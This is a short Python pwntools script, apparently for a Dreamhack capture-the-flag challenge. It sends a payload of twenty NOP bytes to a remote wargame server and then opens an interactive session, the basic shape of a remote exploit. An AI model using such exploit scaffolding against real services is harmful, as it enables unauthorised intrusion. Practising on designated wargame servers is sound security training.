from pwn import *

#name
payload = b'\x90' *20

r = remote('host3.dreamhack.games', 14570)

r.send(payload)

r.interactive()